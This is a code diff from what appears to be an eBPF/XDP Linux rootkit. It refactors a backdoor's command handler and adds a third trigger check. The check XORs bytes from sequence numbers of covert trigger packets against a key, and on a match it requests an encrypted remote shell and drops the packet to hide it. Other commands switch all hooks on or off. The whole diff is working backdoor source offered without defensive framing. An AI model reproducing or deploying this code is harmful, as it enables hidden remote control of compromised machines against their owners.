@@ -11,6 +11,29 @@
 #include "../../common/c&c.h"
 #include "../bpf/defs.h"
 
+int execute_key_command(int command_received){
+    int pid = -1; //Received by network stack, just ignore
+    switch(command_received){
+        case CC_PROT_COMMAND_ENCRYPTED_SHELL:
+            bpf_printk("Received request to start encrypted connection\n");
+            ring_buffer_send_backdoor_command(&rb_comm, pid, command_received);
+            break;
+        case CC_PROT_COMMAND_HOOK_ACTIVATE_ALL:
+            bpf_printk("Received request to activate all hooks\n");
+            ring_buffer_send_backdoor_command(&rb_comm, pid, command_received);
+            break;
+        case CC_PROT_COMMAND_HOOK_DEACTIVATE_ALL:
+            bpf_printk("Received request to deactivate all hooks\n");
+            ring_buffer_send_backdoor_command(&rb_comm, pid, command_received);
+            break;
+        default:
+            bpf_printk("Command received unknown: %d\n", command_received);
+    }
+
+    return 0;
+}
+
+
 static __always_inline int manage_backdoor_trigger_v1(char* payload, __u32 payload_size){
     char section[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
     char section2[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
@@ -113,23 +136,7 @@ backdoor_finish:
 
     //If we reach this point then we received trigger packet
     bpf_printk("Finished backdoor V1 check with success\n");
-    int pid = -1; //Received by network stack, just ignore
-    switch(command_received){
-        case CC_PROT_COMMAND_ENCRYPTED_SHELL:
-            bpf_printk("Received request to start encrypted connection\n");
-            ring_buffer_send_backdoor_command(&rb_comm, pid, command_received);
-            break;
-        case CC_PROT_COMMAND_HOOK_ACTIVATE_ALL:
-            bpf_printk("Received request to activate all hooks\n");
-            ring_buffer_send_backdoor_command(&rb_comm, pid, command_received);
-            break;
-        case CC_PROT_COMMAND_HOOK_DEACTIVATE_ALL:
-            bpf_printk("Received request to deactivate all hooks\n");
-            ring_buffer_send_backdoor_command(&rb_comm, pid, command_received);
-            break;
-        default:
-            bpf_printk("Command received unknown: %d\n", command_received);
-    }
+    execute_key_command(command_received);
 
 
     return XDP_DROP; 
@@ -139,16 +146,25 @@ backdoor_finish:
 static __always_inline int manage_backdoor_trigger_v3(struct backdoor_packet_log_data b_data){
     int last_received = b_data.last_packet_modified;
     int first_packet;
-    if(last_received>0&&last_received<3){
-        first_packet = last_received-1;
+    if(last_received>=0&&last_received<2){
+        first_packet = last_received+1;
     }else{
-        first_packet = (CC_STREAM_TRIGGER_PAYLOAD_LEN / CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES) -1;
+        first_packet = 0;
     } 
 
     //The following routine (not just the next check) is necessarily dirty in terms of programming,
     //but the ebpf verifier strongly dislikes MOD operations (check report, screenshot)
     char payload[CC_STREAM_TRIGGER_PAYLOAD_LEN] = {0};
-    if(first_packet == 1){
+    if(first_packet == 0){
+        for(int ii=first_packet; ii<3; ii++){
+            __u32 seq_num = b_data.trigger_array[ii].seq_raw;
+            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES*ii), &(seq_num), sizeof(__u32));
+        }
+        for(int ii=0; ii<first_packet; ii++){
+            __u32 seq_num = b_data.trigger_array[ii].seq_raw;
+            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES*ii), &(seq_num), sizeof(__u32));
+        }
+    }else if(first_packet == 1){
         for(int ii=first_packet; ii<3; ii++){
             __u32 seq_num = b_data.trigger_array[ii].seq_raw;
             __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES*ii), &(seq_num), sizeof(__u32));
@@ -158,15 +174,6 @@ static __always_inline int manage_backdoor_trigger_v3(struct backdoor_packet_log
             __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES*ii), &(seq_num), sizeof(__u32));
         }
     }else if(first_packet == 2){
-        for(int ii=first_packet; ii<3; ii++){
-            __u32 seq_num = b_data.trigger_array[ii].seq_raw;
-            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES*ii), &(seq_num), sizeof(__u32));
-        }
-        for(int ii=0; ii<first_packet; ii++){
-            __u32 seq_num = b_data.trigger_array[ii].seq_raw;
-            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES*ii), &(seq_num), sizeof(__u32));
-        }
-    }else if(first_packet == 3){
         for(int ii=first_packet; ii<3; ii++){
             __u32 seq_num = b_data.trigger_array[ii].seq_raw;
             __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES*ii), &(seq_num), sizeof(__u32));
@@ -221,9 +228,35 @@ static __always_inline int manage_backdoor_trigger_v3(struct backdoor_packet_log
         return XDP_PASS;
     }
 
+    //Check the K3 used, that indicates the command issued, and whether it was a valid payload too
+    char key3[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
+    char result[CC_TRIGGER_SYN_PACKET_SECTION_LEN+1];
+    int correct = 1;
+    int command_received = -1;
+    //Encrypted shell request
+    __builtin_memcpy(key3, CC_STREAM_TRIGGER_KEY_ENCRYPTED_SHELL, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
+        result[ii] = payload[0x05+ii] ^ payload[0x08+ii];
+        if(result[ii]!=(key3[ii])){
+            bpf_printk("R: %x, K3:%x", result[ii], key3[ii]);
+            bpf_printk("P5:%x, P8:%x\n", payload[0x05+ii], payload[0x08+ii]);
+            correct = 0;
+        }
+    }
+    if(correct == 1){
+        //Found valid k3 value
+        command_received = CC_PROT_COMMAND_ENCRYPTED_SHELL;
+        goto backdoor_finish_v3;
+    }
 
+backdoor_finish_v3:
+    //Found no valid key 3
+    if(correct==0){
+        bpf_printk("FAIL CHECK 3\n");
+        return XDP_PASS;
+    }
     bpf_printk("Completed backdoor trigger v3, b_data position: %i\n", b_data.last_packet_modified);
-
+    execute_key_command(command_received);
 
     return XDP_DROP;
 }
